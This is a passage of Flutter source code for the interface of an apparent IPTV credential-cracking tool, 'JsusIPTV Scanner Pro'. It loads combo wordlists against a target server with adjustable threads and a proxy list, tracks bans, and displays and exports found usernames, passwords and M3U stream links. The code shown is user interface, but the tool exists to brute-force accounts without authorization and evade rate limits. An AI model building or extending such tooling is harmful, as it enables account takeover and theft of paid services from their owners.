            _scanning ? (_paused ? '[ ▶ RESUME ]' : '[ ⏸ PAUSE ]') : '[ ⚡ EXECUTE SCAN ]',
            _scanning ? (_paused ? cG : cYe) : cG,
            _scanning ? () => setState(() => _paused = !_paused) : _startScan)),
          if (_scanning) ...[
            const SizedBox(width: 10),
            Expanded(child: _dBtn('[ ■ ABORT ]', cRe,
              () { setState(() => _scanning = false); _timer?.cancel(); })),
          ],
          const SizedBox(width: 10),
          Expanded(child: _dBtn('[ 💾 EXPORT ]', cCy, _export)),
        ]),
      ]),
    ),
    // Terminal log
    Expanded(child: Container(
      padding: const EdgeInsets.all(12),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(width: 3, height: 14, color: cG),
          const SizedBox(width: 8),
          const Text('> LIVE OUTPUT', style: TextStyle(fontSize: 11, color: cG,
            fontFamily: 'monospace', letterSpacing: 2, fontWeight: FontWeight.bold,
            shadows: [Shadow(color: cG, blurRadius: 6)])),
          const Spacer(),
          Text('${_logs.length} lines', style: TextStyle(fontSize: 9, color: cDg, fontFamily: 'monospace')),
        ]),
        const SizedBox(height: 8),
        Expanded(child: Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.4),
            borderRadius: BorderRadius.circular(2),
            border: Border.all(color: cBr),
          ),
          child: _logs.isEmpty
            ? Text('// Awaiting commands...\n// Load wordlist and configure target to begin.',
                style: TextStyle(fontSize: 10, color: cDg.withOpacity(0.5), fontFamily: 'monospace'))
            : ListView.builder(
                itemCount: _logs.length,
                itemBuilder: (_, i) => Padding(
                  padding: const EdgeInsets.only(bottom: 1),
                  child: Text(_logs[i],
                    style: TextStyle(
                      fontSize: 10, fontFamily: 'monospace', height: 1.5,
                      color: _logs[i].contains('[HIT]') ? cG
                        : _logs[i].contains('[-]') ? cRe
                        : _logs[i].contains('[!]') ? cYe
                        : _logs[i].contains('[+]') ? cCy
                        : _logs[i].startsWith('═') ? cG.withOpacity(0.3)
                        : cDg,
                    )),
                ),
              ),
        )),
      ]),
    )),
  ]);

  Widget _desktopHits() => Column(children: [
    Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
      decoration: BoxDecoration(
        color: cBg2,
        border: Border(bottom: BorderSide(color: cG.withOpacity(0.2))),
      ),
      child: Row(children: [
        AnimatedBuilder(animation: _glow, builder: (_, __) => Text('$_hn',
          style: TextStyle(fontSize: 24, color: cG, fontFamily: 'monospace',
            fontWeight: FontWeight.bold,
            shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)]))),
        const SizedBox(width: 6),
        Text('HITS', style: TextStyle(fontSize: 11, color: cDg, letterSpacing: 3,
          fontFamily: 'monospace', fontWeight: FontWeight.bold)),
        const Spacer(),
        _miniBtn('CLR', cRe, () => setState(() { _hits.clear(); _hn = 0; })),
      ]),
    ),
    Expanded(child: _hits.isEmpty
      ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
          AnimatedBuilder(animation: _pulse, builder: (_, __) => Text('// NO HITS YET //',
            style: TextStyle(fontSize: 12, color: cG.withOpacity(_pulse.value * 0.4),
              fontFamily: 'monospace', letterSpacing: 2))),
          const SizedBox(height: 6),
          Text('Waiting for credentials...',
            style: TextStyle(fontSize: 9, color: cDg.withOpacity(0.4), fontFamily: 'monospace')),
        ]))
      : ListView.builder(
          padding: const EdgeInsets.all(8),
          itemCount: _hits.length,
          itemBuilder: (_, i) => _desktopHitCard(_hits[i]))),
  ]);

  Widget _desktopHitCard(HitItem h) => Container(
    margin: const EdgeInsets.only(bottom: 8),
    decoration: BoxDecoration(
      color: cBg.withOpacity(0.8),
      borderRadius: BorderRadius.circular(2),
      border: Border(
        left: const BorderSide(color: cG, width: 3),
        top: BorderSide(color: cG.withOpacity(0.2)),
        right: BorderSide(color: cG.withOpacity(0.1)),
        bottom: BorderSide(color: cG.withOpacity(0.1)),
      ),
      boxShadow: [BoxShadow(color: cG.withOpacity(0.08), blurRadius: 10)],
    ),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      // Terminal bar
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
        color: cG.withOpacity(0.05),
        child: Row(children: [
          Container(width: 5, height: 5, decoration: const BoxDecoration(shape: BoxShape.circle, color: cRe)),
          const SizedBox(width: 3),
          Container(width: 5, height: 5, decoration: const BoxDecoration(shape: BoxShape.circle, color: cYe)),
          const SizedBox(width: 3),
          Container(width: 5, height: 5, decoration: const BoxDecoration(shape: BoxShape.circle, color: cG)),
          const SizedBox(width: 8),
          Text('${h.foundAt.toString().substring(11,19)}', style: TextStyle(fontSize: 8, color: cDg, fontFamily: 'monospace')),
        ]),
      ),
      Padding(padding: const EdgeInsets.all(8), child: Column(
        crossAxisAlignment: CrossAxisAlignment.start, children: [
        _dCredRow('USR', h.username, cG),
        _dCredRow('PWD', h.password, cCy),
        _dCredRow('EXP', h.expira, cYe),
        const SizedBox(height: 5),
        h.panelInfo == null
          ? Row(children: [
              const SizedBox(width: 10, height: 10,
                child: CircularProgressIndicator(strokeWidth: 1.5, color: cG)),
              const SizedBox(width: 6),
              Text('scanning panel...', style: TextStyle(fontSize: 8, color: cDg, fontFamily: 'monospace')),
            ])
          : Row(children: [
              _dPanelStat('TV', _fn(h.panelInfo!.live), cG),
              const SizedBox(width: 8),
              _dPanelStat('VOD', _fn(h.panelInfo!.vod), cCy),
              const SizedBox(width: 8),
              _dPanelStat('SER', _fn(h.panelInfo!.series), cMg),
            ]),
        const SizedBox(height: 5),
        Row(children: [
          _miniBtn('CPY', cCy, () {
            var t = 'SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}';
            if (h.panelInfo != null) t += '\nTV: ${h.panelInfo!.live}\nVOD: ${h.panelInfo!.vod}\nSER: ${h.panelInfo!.series}';
            t += '\nM3U: ${h.m3u}';
            Clipboard.setData(ClipboardData(text: t));
            _toast('COPIED');
          }),
          const SizedBox(width: 4),
          _miniBtn('M3U', cG, () {
            Clipboard.setData(ClipboardData(text: h.m3u));
            _toast('M3U COPIED');
          }),
          const SizedBox(width: 4),
          _miniBtn('↺', cMg, () async {
            setState(() => h.panelInfo = null);
            final info = await verifyPanel(h.panel, h.username, h.password);
            setState(() => h.panelInfo = info);
          }),
        ]),
      ])),
    ]),
  );

  Widget _desktopStatusBar() => Container(
    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 5),
    decoration: BoxDecoration(
      color: cBg2.withOpacity(0.97),
      border: Border(top: BorderSide(color: cG.withOpacity(0.2))),
    ),
    child: Row(children: [
      Text('JsusIPTV Scanner Pro v5.0', style: TextStyle(fontSize: 9, color: cDg, fontFamily: 'monospace')),
      const SizedBox(width: 20),
      Container(width: 1, height: 12, color: cBr),
      const SizedBox(width: 20),
      Text('TARGET: ${_srv ?? "NOT SET"}', style: TextStyle(fontSize: 9, color: _srv != null ? cCy : cRe, fontFamily: 'monospace')),
      const SizedBox(width: 20),
      Container(width: 1, height: 12, color: cBr),
      const SizedBox(width: 20),
      Text('WORDLIST: ${_combo.isEmpty ? "NOT LOADED" : "${_fmt(_combo.length)} entries"}',
        style: TextStyle(fontSize: 9, color: _combo.isEmpty ? cRe : cG, fontFamily: 'monospace')),
      const Spacer(),
      StreamBuilder(
        stream: Stream.periodic(const Duration(seconds: 1)),
        builder: (_, __) => Text(DateTime.now().toString().substring(0, 19),
          style: TextStyle(fontSize: 9, color: cDg.withOpacity(0.8), fontFamily: 'monospace')),
      ),
    ]),
  );

  // ═══ MOBILE LAYOUT ═══
  Widget _mobileLayout() => SafeArea(child: Column(children: [
    _mobileHeader(),
    _mobileNav(),
    Expanded(child: _mobileBody()),
  ]));

  Widget _mobileHeader() => Container(
    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
    decoration: BoxDecoration(
      color: cBg2.withOpacity(0.95),
      border: Border(bottom: BorderSide(color: cG.withOpacity(0.3))),
    ),
    child: Row(children: [
      AnimatedBuilder(animation: _glow, builder: (_, __) => Container(
        width: 40, height: 40,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(4),
          border: Border.all(color: cG.withOpacity(0.5)),
          boxShadow: [BoxShadow(color: cG.withOpacity(_glow.value * 0.35), blurRadius: 12)],
        ),
        child: ClipRRect(borderRadius: BorderRadius.circular(3),
          child: Image.asset('android-icon/icon.png',
            errorBuilder: (_, __, ___) => Container(color: cBg2,
              child: const Center(child: Text('Js', style: TextStyle(color: cG, fontSize: 14, fontWeight: FontWeight.bold)))))),
      )),
      const SizedBox(width: 10),
      Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        AnimatedBuilder(animation: _glow, builder: (_, __) => Text(_glitchText,
          style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold, fontFamily: 'monospace',
            foreground: Paint()..shader = LinearGradient(colors: [cG, cCy, cG])
              .createShader(const Rect.fromLTWH(0,0,200,20)),
            shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 12)]))),
        Text('PRO v5.0  ·  POTENCIA · PRECISION · VELOCIDAD',
          style: TextStyle(fontSize: 7, color: cDg.withOpacity(0.8), letterSpacing: 1.5)),
      ])),
      AnimatedBuilder(animation: _pulse, builder: (_, __) => Container(
        padding: const EdgeInsets.symmetric(horizontal: 9, vertical: 5),
        decoration: BoxDecoration(
          color: (_scanning ? cG : cRe).withOpacity(0.08),
          borderRadius: BorderRadius.circular(2),
          border: Border.all(color: (_scanning ? cG : cRe).withOpacity(0.5)),
          boxShadow: [BoxShadow(color: (_scanning ? cG : cRe).withOpacity(_pulse.value * 0.3), blurRadius: 12)],
        ),
        child: Row(mainAxisSize: MainAxisSize.min, children: [
          Container(width: 6, height: 6, decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: _scanning ? cG : cRe,
            boxShadow: [BoxShadow(color: (_scanning ? cG : cRe).withOpacity(_pulse.value), blurRadius: 8)])),
          const SizedBox(width: 5),
          Text(_scanning ? 'ONLINE' : 'IDLE',
            style: TextStyle(fontSize: 9, letterSpacing: 2,
              color: _scanning ? cG : cRe, fontFamily: 'monospace', fontWeight: FontWeight.bold)),
        ]),
      )),
    ]),
  );

  Widget _mobileNav() {
    const tabs = [('⚡','SCAN'),('⚙','CONFIG'),('🎯','HITS'),('🔗','PROXY')];
    return Container(
      decoration: BoxDecoration(
        color: cBg2.withOpacity(0.9),
        border: Border(bottom: BorderSide(color: cG.withOpacity(0.2))),
      ),
      child: Row(children: List.generate(4, (i) {
        final on = _tab == i;
        return Expanded(child: GestureDetector(
          onTap: () => setState(() => _tab = i),
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 200),
            padding: const EdgeInsets.symmetric(vertical: 9),
            decoration: BoxDecoration(
              color: on ? cG.withOpacity(0.07) : Colors.transparent,
              border: Border(bottom: BorderSide(color: on ? cG : Colors.transparent, width: 2))),
            child: Column(mainAxisSize: MainAxisSize.min, children: [
              Text(tabs[i].$1, style: TextStyle(fontSize: 15,
                shadows: on ? [const Shadow(color: cG, blurRadius: 12)] : null)),
              const SizedBox(height: 2),
              Text(tabs[i].$2, style: TextStyle(fontSize: 9, fontWeight: FontWeight.bold,
                letterSpacing: 2, color: on ? cG : cDg, fontFamily: 'monospace',
                shadows: on ? [const Shadow(color: cG, blurRadius: 10)] : null)),
            ]),
          ),
        ));
      })),
    );
  }

  Widget _mobileBody() {
    switch (_tab) {
      case 0: return _mobileScanTab();
      case 1: return _mobileCfgTab();
      case 2: return _mobileHitsTab();
      case 3: return _mobileProxyTab();
      default: return _mobileScanTab();
    }
  }

  Widget _mobileScanTab() => ListView(padding: const EdgeInsets.all(10), children: [
    if (_scanning) ...[
      _termBox(child: Column(children: [
        Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          _rbadge(),
          Container(padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(color: cBg, borderRadius: BorderRadius.circular(2),
              border: Border.all(color: cCy.withOpacity(0.4))),
            child: Text(_elapsed, style: const TextStyle(fontSize: 12, color: cCy,
              fontFamily: 'monospace', letterSpacing: 2, shadows: [Shadow(color: cCy, blurRadius: 8)]))),
        ]),
        const SizedBox(height: 14),
        Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            AnimatedBuilder(animation: _glow, builder: (_, __) => Text('${(_pct*100).toStringAsFixed(2)}%',
              style: TextStyle(fontSize: 18, color: cG, fontFamily: 'monospace',
                fontWeight: FontWeight.bold,
                shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)]))),
            Text('${_fmt(_checked)} / ${_fmt(_total)}',
              style: TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace')),
          ]),
          const SizedBox(height: 8),
          Stack(children: [
            Container(height: 10, decoration: BoxDecoration(color: cBr, borderRadius: BorderRadius.circular(1),
              border: Border.all(color: cG.withOpacity(0.2)))),
            AnimatedContainer(duration: const Duration(milliseconds: 200),
              height: 10,
              width: (MediaQuery.of(context).size.width - 44) * _pct,
              decoration: BoxDecoration(borderRadius: BorderRadius.circular(1),
                gradient: const LinearGradient(colors: [Color(0xFF003310), cG2, cG]),
                boxShadow: [BoxShadow(color: cG.withOpacity(0.6), blurRadius: 8)])),
          ]),
        ]),
        const SizedBox(height: 14),
        Row(children: [
          Expanded(child: _statCard('HITS', '$_hn', cG)),
          const SizedBox(width: 6),
          Expanded(child: _statCard('FAIL', _fmt(_fails), cRe)),
          const SizedBox(width: 6),
          Expanded(child: _statCard('BANS', '$_bans', cYe)),
        ]),
        const SizedBox(height: 8),
        AnimatedBuilder(animation: _glow, builder: (_, __) => Container(
          padding: const EdgeInsets.symmetric(vertical: 12),
          decoration: BoxDecoration(color: cYe.withOpacity(0.04), borderRadius: BorderRadius.circular(2),
            border: Border.all(color: cYe.withOpacity(0.3)),
            boxShadow: [BoxShadow(color: cYe.withOpacity(_glow.value * 0.15), blurRadius: 20)]),
          child: Column(children: [
            Text(_fmt(_cpm), style: TextStyle(fontSize: 36, fontWeight: FontWeight.bold, color: cYe,
              fontFamily: 'monospace', letterSpacing: -2,
              shadows: [Shadow(color: cYe.withOpacity(_glow.value), blurRadius: 20)])),
            Text('CHECKS / MIN', style: TextStyle(fontSize: 8, color: cYe.withOpacity(0.6), letterSpacing: 4)),
          ]),
        )),
        const SizedBox(height: 12),
        Row(children: [
          Expanded(child: _hackerBtn(_paused ? '▶ RESUME' : '⏸ PAUSE',
            c: _paused ? cG : cYe, onTap: () => setState(() => _paused = !_paused))),
          const SizedBox(width: 8),
          Expanded(child: _hackerBtn('■ ABORT', c: cRe,
            onTap: () { setState(() => _scanning = false); _timer?.cancel(); })),
        ]),
      ])),
      _termBox(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _termTitle('> LIVE OUTPUT'),
        const SizedBox(height: 6),
        SizedBox(height: 80, child: ListView.builder(
          itemCount: min(_logs.length, 8),
          itemBuilder: (_, i) => Text(_logs[i], style: TextStyle(fontSize: 9, fontFamily: 'monospace', height: 1.6,
            color: _logs[i].contains('[HIT]') ? cG : _logs[i].contains('[-]') ? cRe
              : _logs[i].contains('[!]') ? cYe : _logs[i].startsWith('═') ? cG.withOpacity(0.3) : cDg)))),
      ])),
    ] else ...[
      _termBox(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _termTitle('> TARGET CONFIGURATION'),
        const SizedBox(height: 10),
        Row(children: [
          AnimatedBuilder(animation: _pulse, builder: (_, __) => Container(width: 8, height: 8,
            decoration: BoxDecoration(shape: BoxShape.circle,
              color: _srv != null ? cG : cRe,
              boxShadow: [BoxShadow(color: (_srv != null ? cG : cRe).withOpacity(_pulse.value), blurRadius: 8)]))),
          const SizedBox(width: 8),
          Text('TARGET: ', style: TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace')),
          Expanded(child: Text(_srv ?? '[NOT SET]',
            style: TextStyle(fontSize: 10, fontFamily: 'monospace',
              color: _srv != null ? cCy : cRe), overflow: TextOverflow.ellipsis)),
        ]),
        const SizedBox(height: 8),
        Row(children: [
          Container(width: 8, height: 8, decoration: BoxDecoration(shape: BoxShape.circle,
            color: _combo.isEmpty ? cRe : cG,
            boxShadow: [BoxShadow(color: (_combo.isEmpty ? cRe : cG).withOpacity(0.6), blurRadius: 6)])),
          const SizedBox(width: 8),
          Text('WORDLIST: ', style: TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace')),
          Expanded(child: Text(_combo.isEmpty ? '[NOT LOADED]' : '${_fmt(_combo.length)} entries',
            style: TextStyle(fontSize: 10, fontFamily: 'monospace',
              color: _combo.isEmpty ? cRe : cYe), overflow: TextOverflow.ellipsis)),
        ]),
        const SizedBox(height: 12),
        Row(children: [
          Expanded(child: _hackerBtn('⚙ CONFIG', c: cCy, onTap: () => setState(() => _tab = 1))),
          const SizedBox(width: 8),
          Expanded(child: _hackerBtn('📂 WORDLIST', c: cYe, onTap: _loadCombo)),
        ]),
      ])),
      _termBox(child: Column(children: [
        _termTitle('> PARAMETERS'),
        const SizedBox(height: 10),
        Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          Text('THREADS:', style: TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace')),
          AnimatedBuilder(animation: _glow, builder: (_, __) => Text('$_bots',
            style: TextStyle(fontSize: 20, color: cG, fontFamily: 'monospace', fontWeight: FontWeight.bold,
              shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 10)]))),
        ]),
        Slider(value: _bots.toDouble(), min: 1, max: 100,
          onChanged: (v) => setState(() => _bots = v.round())),
        Row(children: [
          Expanded(child: _paramBox('PROXY', _proxies.isEmpty ? 'NONE' : '${_proxies.length}px', cMg)),
          const SizedBox(width: 6),
          Expanded(child: _paramBox('TIMEOUT', '${_tout}s', cCy)),
          const SizedBox(width: 6),
          Expanded(child: _paramBox('MODE', 'NATIVE', cG)),
        ]),
      ])),
      _termBox(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _termTitle('> SYSTEM LOG'),
        const SizedBox(height: 6),
        Container(height: 120, color: Colors.black.withOpacity(0.3),
          child: _logs.isEmpty
            ? Padding(padding: const EdgeInsets.all(8),
                child: Text('// Awaiting commands...',
                  style: TextStyle(fontSize: 9, color: cDg.withOpacity(0.5), fontFamily: 'monospace')))
            : ListView.builder(padding: const EdgeInsets.all(6),
                itemCount: _logs.length,
                itemBuilder: (_, i) => Text(_logs[i],
                  style: TextStyle(fontSize: 9, fontFamily: 'monospace', height: 1.6,
                    color: _logs[i].contains('[HIT]') ? cG : _logs[i].contains('[-]') ? cRe
                      : _logs[i].contains('[!]') ? cYe : _logs[i].contains('[+]') ? cCy
                      : _logs[i].startsWith('═') ? cG.withOpacity(0.3) : cDg)))),
      ])),
      const SizedBox(height: 4),
      AnimatedBuilder(animation: _glow, builder: (_, __) => GestureDetector(
        onTap: _startScan,
        child: Container(
          width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 18),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(2),
            border: Border.all(color: cG.withOpacity(0.7), width: 1.5),
            gradient: LinearGradient(colors: [cG.withOpacity(0.04), cG.withOpacity(0.1), cG.withOpacity(0.04)]),
            boxShadow: [BoxShadow(color: cG.withOpacity(_glow.value * 0.35), blurRadius: 25),
              BoxShadow(color: cG.withOpacity(0.15), blurRadius: 50)]),
          child: Text('[ EXECUTE SCAN ]', textAlign: TextAlign.center,
            style: TextStyle(fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 4,
              fontFamily: 'monospace', color: cG,
              shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)]))))),
    ],
  ]);

  Widget _mobileCfgTab() => ListView(padding: const EdgeInsets.all(10), children: [
    _termBox(child: Column(children: [
      _termTitle('> TARGET SERVER'),
      const SizedBox(height: 10),
      TextField(
        controller: _srvCtrl,
        style: const TextStyle(color: cG, fontSize: 12, fontFamily: 'monospace'),
        decoration: InputDecoration(
          hintText: 'http://target.server:8080',
          hintStyle: TextStyle(color: cDg.withOpacity(0.5), fontSize: 11, fontFamily: 'monospace'),
          filled: true, fillColor: Colors.black54,
          prefixText: '>> ', prefixStyle: const TextStyle(color: cG, fontFamily: 'monospace'),
          border: OutlineInputBorder(borderRadius: BorderRadius.circular(2), borderSide: BorderSide(color: cG.withOpacity(0.3))),
          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(2), borderSide: BorderSide(color: cG.withOpacity(0.3))),
          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(2), borderSide: const BorderSide(color: cG, width: 1.5)),
          contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12),
        ),
      ),
      const SizedBox(height: 8),
      _hackerBtn('[ CONNECT & VERIFY ]', c: cCy, onTap: _addSrv),
      if (_srvs.isNotEmpty) ...[
        const SizedBox(height: 10),
        _termTitle('> ACTIVE TARGETS'),
        const SizedBox(height: 6),
        ..._srvs.asMap().entries.map((e) => Container(
          margin: const EdgeInsets.only(bottom: 5),
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
          decoration: BoxDecoration(
            color: e.value == _srv ? cG.withOpacity(0.05) : Colors.transparent,
            borderRadius: BorderRadius.circular(2),
            border: Border.all(color: e.value == _srv ? cG.withOpacity(0.4) : cBr)),
          child: Row(children: [
            Text('[${e.key+1}] ', style: const TextStyle(color: cDg, fontSize: 10, fontFamily: 'monospace')),
            Expanded(child: Text(e.value, style: TextStyle(fontSize: 10,
              color: e.value == _srv ? cG : cCy, fontFamily: 'monospace'), overflow: TextOverflow.ellipsis)),
            GestureDetector(
              onTap: () => setState(() { _srvs.removeAt(e.key); _srv = _srvs.isNotEmpty ? _srvs[0] : null; }),
              child: const Text('[X]', style: TextStyle(color: cRe, fontSize: 10, fontFamily: 'monospace'))),
          ]),
        )),
      ],
    ])),
    _termBox(child: Column(children: [
      _termTitle('> TIMEOUT'),
      const SizedBox(height: 8),
      Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
        Text('TIMEOUT:', style: const TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace')),
        Text('${_tout}s', style: const TextStyle(fontSize: 20, color: cG,
          fontFamily: 'monospace', fontWeight: FontWeight.bold,
          shadows: [Shadow(color: cG, blurRadius: 8)])),
      ]),
      Slider(value: _tout.toDouble(), min: 5, max: 30,
        onChanged: (v) => setState(() => _tout = v.round())),
      Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly,
        children: [5,8,10,15,20].map<Widget>((v) => GestureDetector(
          onTap: () => setState(() => _tout = v),
          child: Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
            decoration: BoxDecoration(
              color: _tout == v ? cG.withOpacity(0.15) : Colors.transparent,
              borderRadius: BorderRadius.circular(2),
              border: Border.all(color: _tout == v ? cG : cBr)),
            child: Text('${v}s', style: TextStyle(fontSize: 10,
              color: _tout == v ? cG : cDg, fontFamily: 'monospace',
              fontWeight: FontWeight.bold))))).toList()),
    ])),
  ]);

  Widget _mobileHitsTab() => Column(children: [
    Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
      decoration: BoxDecoration(color: cBg2.withOpacity(0.95),
        border: Border(bottom: BorderSide(color: cG.withOpacity(0.2)))),
      child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
        Row(children: [
          Text('// HITS: ', style: TextStyle(fontSize: 12, color: cDg, fontFamily: 'monospace')),
          AnimatedBuilder(animation: _glow, builder: (_, __) => Text('$_hn',
            style: TextStyle(fontSize: 22, color: cG, fontFamily: 'monospace',
              fontWeight: FontWeight.bold,
              shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)]))),
        ]),
        Row(children: [
          _miniBtn('EXPORT', cCy, _export),
          const SizedBox(width: 6),
          _miniBtn('CLEAR', cRe, () => setState(() { _hits.clear(); _hn = 0; })),
        ]),
      ]),
    ),
    Expanded(child: _hits.isEmpty
      ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
          AnimatedBuilder(animation: _pulse, builder: (_, __) => Text('// NO HITS YET //',
            style: TextStyle(fontSize: 14, color: cG.withOpacity(_pulse.value * 0.5),
              fontFamily: 'monospace', letterSpacing: 3))),
          const SizedBox(height: 8),
          Text('Execute a scan to find credentials',
            style: TextStyle(fontSize: 10, color: cDg.withOpacity(0.5), fontFamily: 'monospace')),
        ]))
      : ListView.builder(padding: const EdgeInsets.all(10),
          itemCount: _hits.length,
          itemBuilder: (_, i) => _mobileHitCard(_hits[i]))),
  ]);

  Widget _mobileHitCard(HitItem h) => Container(
    margin: const EdgeInsets.only(bottom: 10),
    decoration: BoxDecoration(
      color: cBg2.withOpacity(0.9), borderRadius: BorderRadius.circular(2),
      border: Border(left: const BorderSide(color: cG, width: 3),
        top: BorderSide(color: cG.withOpacity(0.3)),
        right: BorderSide(color: cG.withOpacity(0.1)),
        bottom: BorderSide(color: cG.withOpacity(0.1))),
      boxShadow: [BoxShadow(color: cG.withOpacity(0.1), blurRadius: 15)]),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Container(padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
        decoration: BoxDecoration(color: cG.withOpacity(0.06),
          border: Border(bottom: BorderSide(color: cG.withOpacity(0.15)))),
        child: Row(children: [
          Container(width: 6, height: 6, decoration: const BoxDecoration(shape: BoxShape.circle, color: cRe)),
          const SizedBox(width: 4),
          Container(width: 6, height: 6, decoration: const BoxDecoration(shape: BoxShape.circle, color: cYe)),
          const SizedBox(width: 4),
          Container(width: 6, height: 6, decoration: const BoxDecoration(shape: BoxShape.circle, color: cG)),
          const SizedBox(width: 10),
          Text('// HIT — ${h.foundAt.toString().substring(11,19)}',
            style: TextStyle(fontSize: 9, color: cDg, fontFamily: 'monospace')),
        ])),
      Padding(padding: const EdgeInsets.fromLTRB(12,10,12,8), child: Column(
        crossAxisAlignment: CrossAxisAlignment.start, children: [
        _credRow('USER', h.username, cG),
        _credRow('PASS', h.password, cCy),
        _credRow('HOST', h.panel, cMg),
        const SizedBox(height: 6),
        Wrap(spacing: 5, runSpacing: 4, children: [
          _termBadge('EXP:${h.expira}', cYe),
          _termBadge('CON:${h.activ}/${h.conex}', cCy),
          _termBadge('ST:${h.status.toUpperCase()}', cG),
          if (h.timezone.isNotEmpty) _termBadge('TZ:${h.timezone}', cMg),
        ]),
      ])),
      Container(margin: const EdgeInsets.symmetric(horizontal: 12),
        padding: const EdgeInsets.all(8),
        decoration: BoxDecoration(color: Colors.black.withOpacity(0.3),
          borderRadius: BorderRadius.circular(2), border: Border.all(color: cBr)),
        child: h.panelInfo == null
          ? Row(children: [
              const SizedBox(width: 12, height: 12,
                child: CircularProgressIndicator(strokeWidth: 1.5, color: cG)),
              const SizedBox(width: 8),
              Text('// scanning panel resources...',
                style: TextStyle(fontSize: 9, color: cDg, fontFamily: 'monospace')),
            ])
          : Row(children: [
              Expanded(child: _panelStat('LIVE', _fn(h.panelInfo!.live), cG)),
              Container(width: 1, height: 30, color: cBr),
              Expanded(child: _panelStat('VOD', _fn(h.panelInfo!.vod), cCy)),
              Container(width: 1, height: 30, color: cBr),
              Expanded(child: _panelStat('SER', _fn(h.panelInfo!.series), cMg)),
            ])),
      Padding(padding: const EdgeInsets.fromLTRB(12,8,12,10), child: Row(children: [
        Expanded(child: _miniBtn('COPY', cCy, () {
          var t = 'SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}';
          if (h.panelInfo != null) t += '\nLIVE: ${h.panelInfo!.live}\nVOD: ${h.panelInfo!.vod}\nSER: ${h.panelInfo!.series}';
          t += '\nM3U: ${h.m3u}';
          Clipboard.setData(ClipboardData(text: t));
          _toast('COPIED');
        })),
        const SizedBox(width: 5),
        Expanded(child: _miniBtn('M3U', cG, () {
          Clipboard.setData(ClipboardData(text: h.m3u));
          _toast('M3U COPIED');
        })),
        const SizedBox(width: 5),
        _miniBtn('↺', cMg, () async {
          setState(() => h.panelInfo = null);
          final info = await verifyPanel(h.panel, h.username, h.password);
          setState(() => h.panelInfo = info);
          _toast('RESCANNED');
        }),
      ])),
    ]),
  );

  Widget _mobileProxyTab() => ListView(padding: const EdgeInsets.all(10), children: [
    _termBox(child: Column(children: [
      _termTitle('> PROXY MODULE'),
      const SizedBox(height: 10),
      _hackerBtn('📂 LOAD PROXY LIST', c: cMg, onTap: _loadProxies),
      const SizedBox(height: 10),
      _credRow('LOADED', '${_proxies.length} proxies', cG),
      _credRow('MODE', _proxies.isEmpty ? 'DIRECT' : 'PROXY', _proxies.isEmpty ? cDg : cG),
      if (_proxies.isNotEmpty) ...[
        const SizedBox(height: 8),
        _hackerBtn('[ CLEAR ]', c: cRe, onTap: () => setState(() => _proxies.clear())),
      ],
    ])),
  ]);

  // ═══ SHARED WIDGETS ═══
  Widget _termBox({required Widget child}) => Container(
    margin: const EdgeInsets.only(bottom: 10),
    padding: const EdgeInsets.all(12),
    decoration: BoxDecoration(
      color: cBg2.withOpacity(0.88),
      borderRadius: BorderRadius.circular(2),
      border: Border.all(color: cG.withOpacity(0.2)),
      boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 15)]),
    child: child,
  );

  Widget _termTitle(String t) => Row(children: [
    Container(width: 2, height: 12, color: cG, margin: const EdgeInsets.only(right: 8)),
    Text(t, style: const TextStyle(fontSize: 10, color: cG, fontFamily: 'monospace',
      letterSpacing: 2, fontWeight: FontWeight.bold,
      shadows: [Shadow(color: cG, blurRadius: 6)])),
  ]);

